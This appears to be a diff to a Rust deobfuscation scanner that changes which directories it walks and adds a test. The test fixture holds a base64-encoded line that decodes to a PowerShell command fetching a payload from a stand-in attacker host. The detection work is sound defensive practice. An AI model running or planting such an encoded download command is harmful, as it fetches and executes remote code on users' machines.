@@ -22,17 +22,6 @@ const MAX_ORIGINAL_CHARS: usize = 300;
 const MAX_DECODED_CHARS: usize = 1200;
 const MIN_BASE64_CHARS: usize = 16;
 
-const SKIP_DIRS: &[&str] = &[
-    ".git",
-    "node_modules",
-    "__pycache__",
-    ".tox",
-    ".eggs",
-    "target",
-    "venv",
-    ".venv",
-];
-
 const TEXT_EXTENSIONS: &[&str] = &[
     "py", "js", "ts", "mjs", "cjs", "jsx", "tsx", "sh", "bash", "zsh", "ps1", "bat", "cmd", "vbs",
     "vbe", "php", "java", "kt", "kts", "rb", "pl", "lua", "html", "htm", "json", "yaml", "yml",
@@ -101,7 +90,10 @@ struct ScanState<'a> {
     decodes: usize,
 }
 
-pub fn analyze_directory(dir: &Path) -> DeobfuscationReport {
+/// `tree`: same directory skipping as the scanner (`scanner::skip_dir`). A
+/// list of its own here left an encoded script under a package's `venv/` or
+/// `target/` undecoded.
+pub fn analyze_directory(dir: &Path, tree: scanner::Tree) -> DeobfuscationReport {
     let mut report = DeobfuscationReport {
         engine: ENGINE.to_string(),
         ..Default::default()
@@ -110,11 +102,11 @@ pub fn analyze_directory(dir: &Path) -> DeobfuscationReport {
 
     for entry in WalkDir::new(dir)
         .follow_links(false)
+        // The package's own files first: the walk stops at a file and a
+        // binary count, which a large `node_modules` would use up.
+        .sort_by_key(|entry| entry.file_name() == "node_modules")
         .into_iter()
-        .filter_entry(|entry| {
-            let name = entry.file_name().to_string_lossy();
-            !entry.path().is_dir() || !SKIP_DIRS.contains(&name.as_ref())
-        })
+        .filter_entry(|entry| !scanner::skip_dir(entry, tree))
     {
         let entry = match entry {
             Ok(entry) => entry,
@@ -694,7 +686,7 @@ fn is_utf16le(bytes: &[u8]) -> bool {
     zeros * 100 / (bytes.len() / 2) >= 30
 }
 
-fn try_decompress(bytes: &[u8]) -> Option<(&'static str, Vec<u8>)> {
+pub(crate) fn try_decompress(bytes: &[u8]) -> Option<(&'static str, Vec<u8>)> {
     if bytes.len() < 8 {
         return None;
     }
@@ -994,6 +986,25 @@ mod tests {
             .artifacts
             .iter()
             .any(|artifact| artifact.decoded.contains("powershell")));
+    }
+
+    #[test]
+    fn a_package_is_decoded_in_the_directories_an_own_tree_skips() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join("target")).unwrap();
+        std::fs::write(
+            dir.path().join("target/run.py"),
+            r#"payload = base64.b64decode("cG93ZXJzaGVsbCAtYyBodHRwczovL2V2aWwuZXhhbXBsZS9wYXlsb2Fk")"#,
+        )
+        .unwrap();
+        let package = analyze_directory(dir.path(), scanner::Tree::Package);
+        assert_eq!(package.files_scanned, 1);
+        assert!(package
+            .artifacts
+            .iter()
+            .any(|artifact| artifact.decoded.contains("powershell")));
+        let own = analyze_directory(dir.path(), scanner::Tree::Own);
+        assert_eq!(own.files_scanned, 0);
     }
 
     #[test]
